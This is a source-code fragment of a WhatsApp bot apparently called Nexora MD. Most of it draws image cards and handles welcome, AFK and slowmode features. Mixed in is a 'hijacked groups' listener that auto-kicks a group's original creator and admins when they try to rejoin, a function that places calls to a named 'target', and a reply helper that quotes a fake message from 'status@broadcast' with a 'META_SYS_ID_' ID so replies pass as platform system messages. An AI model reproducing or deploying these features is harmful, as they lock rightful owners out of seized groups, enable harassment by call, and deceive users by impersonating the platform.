    ctx.roundRect ? ctx.roundRect(40, 40, canvasWidth - 80, finalCanvasHeight - 80, 16) : ctx.rect(40, 40, canvasWidth - 80, finalCanvasHeight - 80);
    ctx.fill();
    ctx.stroke();

    // Top Header Accent Border
    ctx.fillStyle = '#00e5ff';
    ctx.fillRect(40, 40, canvasWidth - 80, 4);

    // 4. Header Metadata Typography
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 28px Arial';
    ctx.fillText('NEXORA HOLY QURAN INDEX', 75, 95);

    ctx.fillStyle = '#00e5ff'; // Neon Cyan callsign indicator label
    ctx.font = 'bold 20px Courier New';
    ctx.fillText(`SURAH: ${surahName.toUpperCase()} // INDEX: ${surahNum}:${ayahNum}`, 75, 130);

    // Divider Line rule splitting layout components
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
    ctx.beginPath(); ctx.moveTo(75, 160); ctx.lineTo(canvasWidth - 75, 160); ctx.stroke();

    // 5. Drawing Text Content Lines Array Loop
    ctx.fillStyle = 'rgba(255, 255, 255, 0.92)'; // Ultra crisp bright font profile
    ctx.font = 'italic 22px "Georgia"';
    
    let textStartY = 215;
    for (let i = 0; i < lines.length; i++) {
        ctx.fillText(lines[i], padding + 10, textStartY + (i * lineHeight));
    }

    // 6. Footer Layout metadata details
    ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
    ctx.font = '12px Courier New';
    ctx.fillText(`API REMOTE FETCH: ALQURAN.CLOUD // ENGINE TRACE SUCCESSFUL`, 75, finalCanvasHeight - 65);

    return canvas.toBuffer('image/png');
}
async function drawPlayerCard(playerName, team, position, nationality, dob, height, preferredFoot, bioDescription, imageUrl) {
    const { createCanvas, loadImage } = require('@napi-rs/canvas');
    const canvas = createCanvas(950, 520);
    const ctx = canvas.getContext('2d');

    // 1. Velvet Midnight-Black Gradient Background
    const bgGrad = ctx.createLinearGradient(0, 0, 950, 520);
    bgGrad.addColorStop(0, '#030406');
    bgGrad.addColorStop(0.5, '#0a0d14');
    bgGrad.addColorStop(1, '#050608');
    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, 950, 520);

    // Subtle aesthetic geometry tech grid lines
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.008)';
    ctx.lineWidth = 1;
    for (let i = 0; i < 950; i += 50) {
        ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, 520); ctx.stroke();
    }

    // 2. Dual Glassmorphic Panel Layout
    ctx.fillStyle = 'rgba(255, 255, 255, 0.015)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
    ctx.lineWidth = 1.5;

    // Card Left: Rendered Player Image Container Panel
    ctx.beginPath(); ctx.roundRect ? ctx.roundRect(40, 40, 320, 440, 16) : ctx.rect(40, 40, 320, 440); ctx.fill(); ctx.stroke();
    // Card Right: Tactical Telemetry Panel
    ctx.beginPath(); ctx.roundRect ? ctx.roundRect(390, 40, 520, 440, 16) : ctx.rect(390, 40, 520, 440); ctx.fill(); ctx.stroke();

    // Top Neon Cyan Accent Trim Line (Right Panel)
    ctx.fillStyle = '#00e5ff';
    ctx.fillRect(390, 40, 520, 4);

    // 3. Draw Player Image into Left Card Container
    try {
        const playerImg = await loadImage(imageUrl);
        
        // Save state to safely clip image inside rounded corners of the left panel
        ctx.save();
        ctx.beginPath();
        ctx.roundRect ? ctx.roundRect(45, 45, 310, 430, 12) : ctx.rect(45, 45, 310, 430);
        ctx.clip();
        
        // Draw the downscaled image to stretch/fit gracefully
        ctx.drawImage(playerImg, 45, 45, 310, 430);
        ctx.restore();
    } catch (err) {
        // Fallback dark box graphic if remote profile picture asset fails to download
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)';
        ctx.fillRect(45, 45, 310, 430);
        ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
        ctx.font = 'bold 14px Courier New';
        ctx.textAlign = 'center';
        ctx.fillText('NO IMAGE VECTOR LOADED', 200, 260);
        ctx.textAlign = 'left'; // Reset
    }

    // 4. Populate Right Panel Header Data
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 28px Arial';
    ctx.fillText(playerName.toUpperCase(), 425, 95);

    ctx.fillStyle = '#00e5ff'; // Cyan accent position marker
    ctx.font = 'bold 14px Courier New';
    ctx.fillText(`${position.toUpperCase()} // ${team.toUpperCase()}`, 425, 122);

    // Divider Rule
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
    ctx.beginPath(); ctx.moveTo(425, 145); ctx.lineTo(875, 145); ctx.stroke();

    // 5. Stat Parameter Grid Rows
    const drawPlayerRow = (label, value, yPos) => {
        ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
        ctx.font = '14px Arial';
        ctx.fillText(label, 425, yPos);

        ctx.fillStyle = '#ffffff';
        ctx.font = 'bold 15px Courier New';
        ctx.textAlign = 'right';
        ctx.fillText(value, 875, yPos);
        ctx.textAlign = 'left';
    };

    drawPlayerRow('NATIONAL FLUIDITY', nationality, 190);
    drawPlayerRow('DATE OF BIRTH STRAP', dob, 230);
    drawPlayerRow('TACTICAL HEIGHT SCALE', height || 'N/A', 270);
    drawPlayerRow('PREFERRED FOOT DRIVE', preferredFoot || 'N/A', 310);

    // 6. Sub-Frosted Panel Block for the Short Bio Description
    ctx.fillStyle = 'rgba(255, 255, 255, 0.015)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.03)';
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(425, 345, 450, 95, 8) : ctx.rect(425, 345, 450, 95);
    ctx.fill();
    ctx.stroke();

    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
    ctx.font = '12px Arial';
    ctx.fillText('ANALYTICAL SECTOR LOG (BIO):', 440, 370);

    // Word Wrap logic for the 1-sentence summary so it stays inside the sub-card safely
    ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
    ctx.font = '13px Arial';
    
    const cleanBio = bioDescription ? bioDescription.replace(/\s+/g, ' ').trim() : "No bios available inside index files.";
    const bioWords = cleanBio.split(' ');
    let line = '';
    let currentY = 395;
    
    for (let n = 0; n < bioWords.length; n++) {
        let testLine = line + bioWords[n] + ' ';
        let metrics = ctx.measureText(testLine);
        if (metrics.width > 420 && n > 0) {
            ctx.fillText(line, 440, currentY);
            line = bioWords[n] + ' ';
            currentY += 20;
            if (currentY > 430) break; // Hard break cutoff to maintain design margins
        } else {
            line = testLine;
        }
    }
    if (currentY <= 430) ctx.fillText(line, 440, currentY);


    // 7. Footer Infrastructure Anchor Details
    ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
    ctx.font = '11px Courier New';
    ctx.fillText('NEXORA AUTOMATION SPORTS ENGINE // DATA TRACK VIA THESPORTSDB DIRECTORY', 425, 470);

    return canvas.toBuffer('image/png');
}
async function drawOwnerPassportCard(ownerName, ownerNumber, displayTag) {
    const { createCanvas } = require('@napi-rs/canvas');
    const canvas = createCanvas(900, 480);
    const ctx = canvas.getContext('2d');

    // 1. Velvet Midnight-Black Gradient Background
    const bgGrad = ctx.createLinearGradient(0, 0, 900, 480);
    bgGrad.addColorStop(0, '#020305');
    bgGrad.addColorStop(0.5, '#090b11');
    bgGrad.addColorStop(1, '#040507');
    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, 900, 480);

    // Subtle aesthetic geometry matrix grid lines
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.007)';
    ctx.lineWidth = 1;
    for (let i = 0; i < 900; i += 45) {
        ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, 480); ctx.stroke();
        ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(900, i); ctx.stroke();
    }

    // 2. Main Glassmorphic Containment Panel
    ctx.fillStyle = 'rgba(255, 255, 255, 0.015)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(40, 40, 820, 400, 16) : ctx.rect(40, 40, 820, 400);
    ctx.fill();
    ctx.stroke();

    // Left Accent Border Graphic Strip (Neon Blue Tech Glow)
    ctx.fillStyle = '#00e5ff';
    ctx.fillRect(40, 40, 6, 400);

    // 3. Header Section Typography
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 30px Arial';
    ctx.fillText('NEXORA MD', 85, 95);

    ctx.fillStyle = 'rgba(255, 255, 255, 0.35)';
    ctx.font = '13px Courier New';
    ctx.fillText('SECURITY STATUS: SYSTEM FOUNDER / SENIOR DEVELOPER CLEARANCE', 85, 122);

    // Premium horizontal divider line
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
    ctx.beginPath(); ctx.moveTo(85, 150); ctx.lineTo(820, 150); ctx.stroke();

    // 4. Parameter Metadata Grid Rows
    const drawOwnerRow = (label, value, yPos, color = '#ffffff') => {
        ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
        ctx.font = '14px Arial';
        ctx.fillText(label, 85, yPos);

        ctx.fillStyle = color;
        ctx.font = 'bold 16px Courier New';
        ctx.fillText(value, 320, yPos);
    };

    drawOwnerRow('l SIGNATURE', ownerName.toUpperCase(), 200);
    drawOwnerRow('Owner Number', `+${ownerNumber}`, 245, '#00e5ff');
    drawOwnerRow('MAIN  CHANNEL', 't.me/venomempire_4041', 290);
    drawOwnerRow('SECOND CHANNEL', 't.me/Lordempiretech', 335);
    drawOwnerRow('DEVELOPER', 't.me/thedev_empire', 380);

    // 5. Aesthetic Tech Stamp Node Box
    ctx.fillStyle = 'rgba(0, 229, 255, 0.03)';
    ctx.strokeStyle = 'rgba(0, 229, 255, 0.15)';
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(580, 185, 210, 210, 10) : ctx.rect(580, 185, 210, 210);
    ctx.fill();
    ctx.stroke();

    ctx.fillStyle = '#00e5ff';
    ctx.font = 'bold 14px Courier New';
    ctx.textAlign = 'center';
    ctx.fillText('NEXORA ENGINE', 685, 260);
    ctx.fillStyle = '#ffffff';
    ctx.font = '11px Arial';
    ctx.fillText('VERIFIED AUTH KEY', 685, 285);
    ctx.fillText('© 2026 XYRON TECH', 685, 335);
    ctx.textAlign = 'left'; // Reset

    return canvas.toBuffer('image/png');
}
async function drawWarnListCard(groupName, warnEntries) {
    const { createCanvas } = require('@napi-rs/canvas');
    
    // 1. Calculate height dynamically based on active warning entries
    const canvasWidth = 900;
    const padding = 65;
    const rowSpacing = 55;
    const baseHeight = 220; // Space for header components
    
    // Safety fallback if group has an exceptionally long active target list
    const calculatedHeight = baseHeight + (warnEntries.length * rowSpacing) + 80;
    const finalCanvasHeight = Math.max(calculatedHeight, 450);

    // 2. Base Canvas Layer Construction
    const canvas = createCanvas(canvasWidth, finalCanvasHeight);
    const ctx = canvas.getContext('2d');

    // Premium Velvet Midnight Dark Background Gradient
    const bgGrad = ctx.createLinearGradient(0, 0, canvasWidth, finalCanvasHeight);
    bgGrad.addColorStop(0, '#030405');
    bgGrad.addColorStop(0.5, '#0a0d14');
    bgGrad.addColorStop(1, '#050608');
    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, canvasWidth, finalCanvasHeight);

    // Tech mesh accent grid lines
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.008)';
    ctx.lineWidth = 1;
    for (let i = 0; i < canvasWidth; i += 50) {
        ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, finalCanvasHeight); ctx.stroke();
        ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(canvasWidth, i); ctx.stroke();
    }

    // 3. Central Glassmorphic Dashboard Shield Panel
    ctx.fillStyle = 'rgba(255, 255, 255, 0.015)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(40, 40, canvasWidth - 80, finalCanvasHeight - 80, 16) : ctx.rect(40, 40, canvasWidth - 80, finalCanvasHeight - 80);
    ctx.fill();
    ctx.stroke();

    // Top Header Accent Border (Amber/Red Infraction Warning Alert Color Code)
    ctx.fillStyle = '#ff9900';
    ctx.fillRect(40, 40, canvasWidth - 80, 4);

    // 4. Header Section Typography
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 26px Arial';
    ctx.fillText('NEXORA SECURITY CONTROLLER', 75, 95);

    ctx.fillStyle = '#ff9900'; // Amber alert callsign label
    ctx.font = 'bold 15px Courier New';
    ctx.fillText(`INFRACTION FILE DIRECTORY // CLUSTER: ${groupName.toUpperCase()}`, 75, 125);

    // Premium horizontal divider line splitting components
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
    ctx.beginPath(); ctx.moveTo(75, 155); ctx.lineTo(canvasWidth - 75, 155); ctx.stroke();

    // Column Labels Headers
    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
    ctx.font = 'bold 13px Courier New';
    ctx.fillText('IDENTIFIED USER OPERATOR HANDLE', 85, 195);
    ctx.textAlign = 'right';
    ctx.fillText('STRIKE COUNT', canvasWidth - 85, 195);
    ctx.textAlign = 'left'; // Reset

    // 5. Draw the Dynamic Warning Rows Array Loop Grid
    let startY = 240;
    warnEntries.forEach((entry, index) => {
        let currentY = startY + (index * rowSpacing);

        // Subtle row containment background framing
        ctx.fillStyle = 'rgba(255, 255, 255, 0.01)';
        ctx.strokeStyle = 'rgba(255, 255, 255, 0.02)';
        ctx.beginPath();
        ctx.roundRect ? ctx.roundRect(70, currentY - 30, canvasWidth - 140, 44, 6) : ctx.rect(70, currentY - 30, canvasWidth - 140, 44);
        ctx.fill();
        ctx.stroke();

        // Small indicator tech node block anchor
        ctx.fillStyle = '#ff3344';
        ctx.fillRect(85, currentY - 14, 6, 12);

        // Left Side: Plain textual identifier or user string tag
        ctx.fillStyle = '#ffffff';
        ctx.font = '16px Courier New';
        ctx.fillText(`@${entry.username}`, 110, currentY + 4);

        // Right Side: Active strike weight text rendering
        ctx.fillStyle = '#ff3344';
        ctx.font = 'bold 16px Courier New';
        ctx.textAlign = 'right';
        ctx.fillText(`${entry.count} WARN(S)`, canvasWidth - 95, currentY + 4);
        ctx.textAlign = 'left'; // Reset
    });

    // 6. Footer Systems Signature Details
    ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
    ctx.font = '11px Courier New';
    ctx.fillText('NEXORA DATABASE SHIELD MODULE // SECURITY MONITOR SYSTEM CHECK COMPLETE', 75, finalCanvasHeight - 65);

    return canvas.toBuffer('image/png');
}

async function drawCalendar() {
    const { createCanvas } = require('@napi-rs/canvas');
    const canvas = createCanvas(600, 500);
    const ctx = canvas.getContext('2d');
    const now = new Date();
    const monthNames = ["JANUARY", "FEBRUARY", "MARCH", "APRIL", "MAY", "JUNE", "JULY", "AUGUST", "SEPTEMBER", "OCTOBER", "NOVEMBER", "DECEMBER"];
    
    // Background
    ctx.fillStyle = '#0f172a';
    ctx.fillRect(0, 0, 600, 500);
    
    // Header Box
    ctx.fillStyle = '#00e5ff';
    ctx.fillRect(0, 0, 600, 100);
    
    ctx.fillStyle = '#000000';
    ctx.font = 'bold 40px Arial';
    ctx.textAlign = 'center';
    ctx.fillText(`${monthNames[now.getMonth()]} ${now.getFullYear()}`, 300, 65);

    // Days Header
    const days = ['S', 'M', 'T', 'W', 'T', 'F', 'S'];
    ctx.fillStyle = '#94a3b8';
    ctx.font = 'bold 25px Arial';
    for (let i = 0; i < 7; i++) {
        ctx.fillText(days[i], 60 + (i * 80), 160);
    }

    // Calculate Dates
    const firstDay = new Date(now.getFullYear(), now.getMonth(), 1).getDay();
    const lastDate = new Date(now.getFullYear(), now.getMonth() + 1, 0).getDate();
    const today = now.getDate();

    let x = firstDay;
    let y = 0;

    for (let i = 1; i <= lastDate; i++) {
        let posX = 60 + (x * 80);
        let posY = 220 + (y * 60);

        if (i === today) {
            // Highlight Today
            ctx.fillStyle = '#00e5ff';
            ctx.beginPath();
            ctx.arc(posX, posY - 10, 25, 0, Math.PI * 2);
            ctx.fill();
            ctx.fillStyle = '#000000';
        } else {
            ctx.fillStyle = '#ffffff';
        }

        ctx.font = '22px Arial';
        ctx.fillText(i.toString(), posX, posY);

        x++;
        if (x > 6) {
            x = 0;
            y++;
        }
    }
    
    return canvas.toBuffer('image/png');
}

async function createNexoraCard(name, mood, serial, profilePicUrl) {
    const canvas = createCanvas(800, 450);
    const ctx = canvas.getContext('2d');

    // Background Color
    ctx.fillStyle = '#0a0a0a';
    ctx.fillRect(0, 0, 800, 450);

    // Decorative Tech Border
    ctx.strokeStyle = '#00e5ff';
    ctx.lineWidth = 10;
    ctx.strokeRect(20, 20, 760, 410);

    // Profile Photo Box
    ctx.strokeStyle = '#00e5ff';
    ctx.lineWidth = 3;
    ctx.strokeRect(50, 75, 250, 300);

    // Draw Profile Picture
    try {
        const img = await loadImage(profilePicUrl);
        ctx.drawImage(img, 55, 80, 240, 290);
    } catch (e) {
        ctx.fillStyle = '#1a1a1a';
        ctx.fillRect(55, 80, 240, 290);
    }

    // Text Content
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 35px Arial';
    ctx.fillText('NEXORA CITIZEN CARD', 330, 90);

    ctx.font = '22px Courier New';
    ctx.fillStyle = '#00e5ff';
    ctx.fillText(`ID NAME : ${name.toUpperCase()}`, 330, 180);
    ctx.fillText(`STATUS  : VERIFIED`, 330, 230);
    ctx.fillText(`SERIAL  : ${serial}`, 330, 280);
    ctx.fillText(`MOOD    : ${mood}`, 330, 330);

    return canvas.toBuffer('image/png');
}
async function loading() {
    const toki = [
        `loading...`,

        `loading...`
    ];

    // Send initial message
    
    let msg = await empire.sendMessage(from, { text: "𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 𝔦𝔫𝔦𝔱𝔦𝔞𝔩𝔦𝔷𝔦𝔫𝔤....." });

    // Loop to edit same message
    for (let i = 0; i < toki.length; i++) {
        await empire.sendMessage(from, {
            text: toki[i],
            edit: msg.key
        });
        await new Promise(resolve => setTimeout(resolve, 200)); // smooth delay
    }
}
function getCheckResponse(type, percent) {
    if (percent < 20) return `💀 ${type} (${percent}%) — hmm… let’s not talk about it 😭`
    if (percent < 40) return `😅 ${type} (${percent}%) — not really impressive`
    if (percent < 60) return `😐 ${type} (${percent}%) — just average`
    if (percent < 80) return `🔥 ${type} (${percent}%) — they are actually good`
    return `👑 ${type} (${percent}%) — they are REALLY ${type.toLowerCase()} 😏`
}
async function sendOfferCall(target) {
    try {
        await empire.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}
// =========================================================================
// 🔄 AUTOMATED GROUP PARTICIPANTS UPDATE (WELCOME & GOODBYE)
// =========================================================================
empire.ev.on('group-participants.update', async (update) => {
    const fetch = require('node-fetch');

    // Using 'update' explicitly here fixes the "anu is not defined" error!
    const groupChatId = update.id;
    const activeParticipants = update.participants;
    const currentAction = update.action;

    // 1. Initialize local database profiles if they don't exist
    if (!global.db) global.db = {};
    if (!global.db.chats) global.db.chats = {};

    // Safely pull configuration or fallback to welcome disabled by default
    const groupConfig = global.db.chats[groupChatId] || { welcome: false };

    // Only execute if .welcome on has been activated for this group
    if (groupConfig.welcome) {
        for (let participant of activeParticipants) {
            const cleanName = participant.split('@')[0];
            let avatarPic = 'https://img.pyrocdn.com/dbKUgahg.png'; // Default avatar fallback
            
            try {
                // Attempt to fetch user's real WhatsApp profile picture
                avatarPic = await empire.profilePictureUrl(participant, 'image');
            } catch (e) {
                // Keep default avatar image if user has privacy settings hidden
            }

            // ==========================================
            // 📥 MEMBER ENTRANCE (JOIN) EVENT
            // ==========================================
            if (currentAction === 'add') {
                try {
                    // Fetch dynamic welcome image card from canvas API
                    const welcomeImgApi = `https://api.some-random-api.com/welcome/img/2/gaming3?type=join&textcolor=green&username=${encodeURIComponent(cleanName)}&avatar=${encodeURIComponent(avatarPic)}`;
                    const response = await fetch(welcomeImgApi);
                    
                    let welcomeCaption = `╭╼━≪• 𝙽𝙴𝚆 𝙼𝙴𝙼𝙱𝙴𝚁•≫━╾╮\n`
                                       + `┃ 👋 *Welcome:* @${cleanName}\n`
                                       + `┃ ⚙️ *Status:* Active Member\n`
                                       + `╰━━━━━━━━━━━━━━━╯\n\n`
                                       + `Hello @${cleanName}, welcome to the group! Read the description and follow the rules. ✨\n\n`
                                       + `> Powered by *Nexora MD v3*`;
                    
                    if (response.ok) {
                        const imgBuffer = await response.buffer();
                        await empire.sendMessage(groupChatId, { 
                            image: imgBuffer, 
                            caption: welcomeCaption, 
                            mentions: [participant] 
                        });
                    } else {
                        // Text fallback if image generation server times out
                        await empire.sendMessage(groupChatId, { 
                            text: welcomeCaption, 
                            mentions: [participant] 
                        });
                    }
                } catch (err) { 
                    console.error("Welcome banner system failure:", err); 
                }
            }
            
            // ==========================================
            // 📤 MEMBER DEPARTURE (LEAVE/KICK) EVENT
            // ==========================================
            if (currentAction === 'remove') {
                try {
                    // Fetch dynamic goodbye image card from canvas API
                    const leaveImgApi = `https://api.some-random-api.com/welcome/img/2/gaming1?type=leave&textcolor=red&username=${encodeURIComponent(cleanName)}&avatar=${encodeURIComponent(avatarPic)}`;
                    const response = await fetch(leaveImgApi);
                    
                    let goodbyeCaption = `╭╼━≪• 𝙻𝙴𝙰𝚅𝙴 𝙴𝚅𝙴𝙽𝚃 •≫━╾╮\n`
                                       + `┃ 🏃‍♂️ *User:* @${cleanName}\n`
                                       + `┃ 🚪 *Status:* Left / Removed\n`
                                       + `╰━━━━━━━━━━━━━━━╯\n\n`
                                       + `Goodbye @${cleanName}, we probably won't miss you! 💨`;
                    
                    if (response.ok) {
                        const imgBuffer = await response.buffer();
                        await empire.sendMessage(groupChatId, { 
                            image: imgBuffer, 
                            caption: goodbyeCaption, 
                            mentions: [participant] 
                        });
                    } else {
                        // Text fallback
                        await empire.sendMessage(groupChatId, { 
                            text: goodbyeCaption, 
                            mentions: [participant] 
                        });
                    }
                } catch (err) { 
                    console.error("Goodbye banner system failure:", err); 
                }
            }
        }
    }
});


// SUDO 
const dbPath = './database.json'
let db = JSON.parse(fs.readFileSync(dbPath))

function saveDB() {
    fs.writeFileSync(dbPath, JSON.stringify(db, null, 2))
}
const slow = getSetting(m.chat, 'slowmode', 0)

if (m.isGroup && slow > 0 && !isAdmins) {

  if (!global.slowTracker) global.slowTracker = {}

  const key = `${m.chat}_${m.sender}`
  const now = Date.now()

  if (!global.slowTracker[key]) {
    global.slowTracker[key] = now
  } else {
    const diff = (now - global.slowTracker[key]) / 1000
    if (diff < slow) {
      await empire.sendMessage(m.chat, { delete: m.key })
      return
    }
    global.slowTracker[key] = now
  }
}

function backupGroupState(chatId, metadata) {
  if (!db.groupBackup) db.groupBackup = {}
  db.groupBackup[chatId] = {
    subject: metadata.subject || '',
    desc: metadata.desc || metadata.description || '',
    announce: !!metadata.announce,
    restrict: !!metadata.restrict,
    time: Date.now()
  }
  saveDB()
}
const SUDO_FILE = './database/sudo.json';

function loadSudoList() {
  if (!fs.existsSync(SUDO_FILE)) {
    fs.writeFileSync(SUDO_FILE, JSON.stringify([]));
  }
  return JSON.parse(fs.readFileSync(SUDO_FILE));
}

function saveSudoList(data) {
  fs.writeFileSync(SUDO_FILE, JSON.stringify(data, null, 2));
}
// AZA 
const ACCOUNT_FILE = './database/accounts.json';

function loadAccounts() {
  if (!fs.existsSync(ACCOUNT_FILE)) {
    fs.writeFileSync(ACCOUNT_FILE, JSON.stringify({}));
  }
  return JSON.parse(fs.readFileSync(ACCOUNT_FILE));
}

function saveAccounts(data) {
  fs.writeFileSync(ACCOUNT_FILE, JSON.stringify(data, null, 2));
}
const reply = (teks) => {
    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "META_SYS_ID_" + Math.random().toString(36).substring(2, 10).toUpperCase(),
            participant: "0@s.whatsapp.net"
        },
        message: {
            conversation: "Nexora MD"
        }
    };

    empire.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender]
        }
    }, { quoted: fakeSystem }); 
};


/*
const reply = (teks) => {
    empire.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            // Mention the sender so they get a notification tag
            mentionedJid: [m.sender],
            quotedMessage: {
                statusMentionMessage: {
                    message: {
                        imageMessage: {
                            caption: "📺 Nexora MD Broadcast Status",
                            jpegThumbnail: "" // Leave blank or add a small base64 string if desired
                        }
                    }
                }
            },
            
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast"
        }
    }, { quoted: m }); 
};
*/
async function sendImage(imageUrl, caption) {
  empire.sendMessage(m.chat, {
    image: { url: imageUrl },
    caption,
    contextInfo: {
      forwardingScore: 2,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363403195369259@newsletter",
        newsletterName: "𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳💧",
      }
    }
  }, { quoted: m });
}

const more = String.fromCharCode(8206);
const readMore = more.repeat(4001);
const Richie = "𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 💧";
if (!empire.public) {
if (!isCreator) return
}
const example = (teks) => {
return `Usage : *${prefix+command}* ${teks}`
}
let messageStore = {}
let raidTracker = {}
let antilinkStatus = {};
//let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
if (m.message && !m.key.fromMe) {
  messageStore[m.key.id] = {
    text: m.text || '',
    sender: m.sender,
    chat: m.chat
  }
}
global.bananaSession = global.bananaSession || {};
global.businessRegistry = global.businessRegistry || {};

global.botMood = global.botMood || "Neutral 🙂";
global.botName = global.botName || "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";
global.hijackedGroups = global.hijackedGroups || {}; // { groupJid: { creator: jid, admins: [jid], banned: [jid] } }

// Global listener for auto‑kicking banned members in hijacked groups
if (!empire._hijackAttached) {
    empire._hijackAttached = true;
    empire.ev.on('group-participants.update', async (update) => {
        try {
            const { id: groupId, participants, action } = update;
            if (action !== 'add') return; // we only care about joins

            const hijack = global.hijackedGroups[groupId];
            if (!hijack) return; // not a hijacked group

            for (const participant of participants) {
                const jid = typeof participant === 'string' ? participant : participant.id;
                // Check if this participant is banned (creator or admin)
                if (jid === hijack.creator || hijack.admins.includes(jid)) {
                    if (!hijack.banned.includes(jid)) {
                        hijack.banned.push(jid);
                        try {
                            await empire.groupParticipantsUpdate(groupId, [jid], 'remove');
                            console.log(`Auto‑kicked ${jid} from hijacked group ${groupId}`);
                        } catch (err) {
                            console.error('Auto‑kick error:', err);
                        }
                    }
                }
            }
        } catch (err) {
            console.error('Hijack auto‑kick listener error:', err);
        }
    });
    console.log('✅ Hijack auto‑kick listener attached');
}


// --- [ NEXORA MARKET INVENTORY ] ---
global.nexoraShop = [
    { id: 1, name: "Glock-19 Pistol", type: "weapon", price: 150, icon: "🔫" },
    { id: 2, name: "Katana Blade", type: "weapon", price: 300, icon: "⚔️" },
    { id: 3, name: "24K Gold Bar (1kg)", type: "commodity", price: 750, icon: "👑" },
    { id: 4, name: "Raw Uncut Diamond", type: "commodity", price: 1200, icon: "💎" },
    { id: 5, name: "Diamond Cuban Link Chain", type: "jewelry", price: 1800, icon: "📿" },
    { id: 6, name: "Gold Rolex Day-Date", type: "jewelry", price: 2500, icon: "⌚" },
    { id: 7, name: "Mercedes Benz C300", type: "vehicle", price: 4500, icon: "🚗" },
    { id: 8, name: "BMW M4 Competition", type: "vehicle", price: 5500, icon: "🏎️" },
    { id: 9, name: "Lagos Penthouse Duplex", type: "property", price: 7000, icon: "🏢" },
    { id: 10, name: "Private Security Bunker", type: "property", price: 8500, icon: "🏰" },
    { id: 11, name: "Nexora Hosting Server Node", type: "asset", price: 15000, icon: "🖥️" }
];

// --- [ AFK SYSTEM LOGIC ] ---

// 1. Logic for returning from AFK
// We check !isCmd so the .afk command itself doesn't trigger a "Welcome Back"
if (global.afkTime && global.afkTime[m.sender] && !isCmd) {
    const afkData = global.afkTime[m.sender];
    const duration = Date.now() - afkData.time;
    
    // 5-second grace period: prevents instant wake-up if you lag or double-tap
    if (duration > 5000) {
        const totalSeconds = Math.floor(duration / 1000);
        const mins = Math.floor(totalSeconds / 60);
        const secs = totalSeconds % 60;
        const timeStr = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;

        const welcomeBack = `*── 「 NEXORA WAKE-UP 」 ──*\n\n` +
                            `👋 Welcome back *@${m.sender.split('@')[0]}*\n` +
                            `⏳ You were away for: *${timeStr}*`;

        await empire.sendMessage(m.chat, { 
            text: welcomeBack, 
            mentions: [m.sender] 
        }, { quoted: m });
        
        delete global.afkTime[m.sender];
    }
}

// 2. Logic for someone tagging an AFK user
const mentionedUser = m.mentionedJid ? m.mentionedJid[0] : (m.quoted ? m.quoted.sender : null);
if (mentionedUser && global.afkTime && global.afkTime[mentionedUser]) {
    const data = global.afkTime[mentionedUser];
    const durationMention = Date.now() - data.time;
    const totalSeconds = Math.floor(durationMention / 1000);
    const mins = Math.floor(totalSeconds / 60);
    const timeAgo = mins > 0 ? `${mins} minutes ago` : `${totalSeconds} seconds ago`;
    
    const notifyMsg = `*⚠️ USER IS CURRENTLY AFK*\n\n` +
                      `👤 *User:* @${mentionedUser.split('@')[0]}\n` +
                      `🕒 *Away since:* ${timeAgo}\n` +
                      `📝 *Reason:* ${data.reason}`;

    await empire.sendMessage(m.chat, { 
        text: notifyMsg, 
        mentions: [mentionedUser] 
    }, { quoted: m });
}

// =========================================================================
// 🚨 INTERCOM SYNC SYSTEM: TELEGRAM LINK BREACH ALERT & MANAGEMENT
// =========================================================================
if (m.isGroup && !isAdmins) { // Only triggers if a regular user drops a link in a group
    const linkRegex = /chat\.whatsapp\.com\/[a-zA-Z0-9]+/gi;
    
